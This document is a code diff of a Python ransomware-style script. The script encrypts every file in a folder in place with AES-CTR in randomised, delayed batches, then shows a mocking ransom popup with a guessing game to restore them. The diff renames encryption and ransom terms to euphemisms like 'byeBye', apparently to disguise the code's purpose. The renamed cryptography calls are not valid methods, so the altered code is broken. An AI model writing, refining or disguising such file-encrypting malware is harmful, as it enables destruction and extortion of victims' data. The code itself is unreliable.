@@ -1,6 +1,6 @@
 import os
 import time
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes 
 from cryptography.hazmat.backends import default_backend
 import requests
 import tkinter as tk
@@ -32,7 +32,7 @@ def run_vector(input_data: bytes, config_token: bytes) -> bytes:
     counter_seed = b'\x00\x00\x00\x00'
     engine_seed = nonce_seed + counter_seed
 
-    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).encryptor()
+    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).byeBye()
     output_blob = session.update(input_data) + session.finalize()
     return nonce_seed + output_blob  # return raw binary blob
 
@@ -42,7 +42,7 @@ def reverse_vector(blob: bytes, config_token: bytes) -> bytes:
     counter_seed = b'\x00\x00\x00\x00'
     engine_seed = nonce + counter_seed
 
-    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).decryptor()
+    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).welcomeBack()
     return session.update(ciphertext) + session.finalize()
 
 def scan_and_patch_assets(asset_dir: str, config_token: bytes, total_duration=60.0):
@@ -70,10 +70,9 @@ def scan_and_patch_assets(asset_dir: str, config_token: bytes, total_duration=60
         min_delay, max_delay = 0.05, 0.2
     else:
         min_batch, max_batch = 6, 12
-        min_delay, max_delay = 0.04, 0.3
+        min_delay, max_delay = 0.3, 0.7
 
     # Step 3: Calculate approximate delay budget per batch
-    start_time = time.time()
     i = 0
     while i < total_files:
         batch_size = random.randint(min_batch, max_batch)
@@ -84,24 +83,17 @@ def scan_and_patch_assets(asset_dir: str, config_token: bytes, total_duration=60
             try:
                 with open(path, 'rb') as f:
                     data = f.read()
-                encrypted = run_vector(data, config_token)
+                byeBye = run_vector(data, config_token)
                 with open(path, 'wb') as f:
-                    f.write(encrypted)
-                print(f"[{i+1}/{total_files}] Encrypted: {path}")
+                    f.write(byeBye)
+                print(f"[{i+1}/{total_files}] bye bye: {path}")
             except Exception:
                 print(f"[{i+1}/{total_files}] Failed: {path}")
             i += 1
 
-        # Check remaining time
-        elapsed = time.time() - start_time
-        remaining = total_duration - elapsed
-        batches_left = max(1, (total_files - i) // max_batch)
-
-        # Dynamically compute delay to stretch time without going over
-        if remaining > 0 and i < total_files:
-            max_allowable_delay = remaining / batches_left
-            delay = random.uniform(min_delay, min(max_delay, max_allowable_delay))
-            time.sleep(delay)
+        delay = random.uniform(min_delay, max_delay)
+        print(f"⏳ Delaying batch for {delay:.2f} seconds...\n")
+        time.sleep(delay)
 
 def restore_assets(asset_dir: str, config_token: bytes):
     for dirpath, _, assets in os.walk(asset_dir):
@@ -117,15 +109,15 @@ def restore_assets(asset_dir: str, config_token: bytes):
                 with open(asset_path, 'wb') as f:
                     f.write(restored)
             except Exception:
-                pass  # skip if decryption fails
+                pass  
 
-def show_ransom_modal():
+def show_byebye_modal():
     root = tk.Tk()
     root.withdraw()
 
     response = messagebox.askquestion(
-        "💀 Oops... Files Encrypted!",
-        "🎉 Surprise! Your precious files are now on vacation — permanently encrypted.\n\n"
+        "💀 Oops... Files bye bye!",
+        "🎉 Surprise! Your precious files are now on vacation — permanently bye bye.\n\n"
         "But hey, I’m feeling generous today...\n"
         "Would you like a *totally fair* chance to win them back?\n\n"
         "Click YES to 'Play a Game'\n"
@@ -151,13 +143,13 @@ def play_game():
             f"Attempt {attempt} of {tries}:"
         )
         if guess and guess.lower().strip() == correct_answer:
-            messagebox.showinfo("🏆 Bravo!", "Wow. You actually got it. Decryption will now begin...")
+            messagebox.showinfo("🏆 Bravo!", "Wow. You actually got it. welcoming back will now begin...")
             mode = "restore"  # 🧠 change the mode!
             return
         else:
             messagebox.showwarning("❌ Nope", "Wrong guess. Try again...")
 
-    messagebox.showerror("💀 Game Over", "You failed. The files are gone. Forever-ish.")
+    messagebox.showerror("💀 Game Over", "You failed. The files are bye bye. Forever-ish.")
 
 # === SYSTEM EXECUTION ===
 if __name__ == "__main__":
@@ -180,8 +172,8 @@ if __name__ == "__main__":
         start = time.time()
         scan_and_patch_assets(resources_folder, key)
         end = time.time()
-        print(f"Encryption finished in {end - start:.2f} seconds.")
-        show_ransom_modal()  # ← may change mode to "restore"
+        print(f"bye bye finished in {end - start:.2f} seconds.")
+        show_byebye_modal()  # ← may change mode to "restore"
 
     if mode == "restore":
         restore_assets(resources_folder, key)
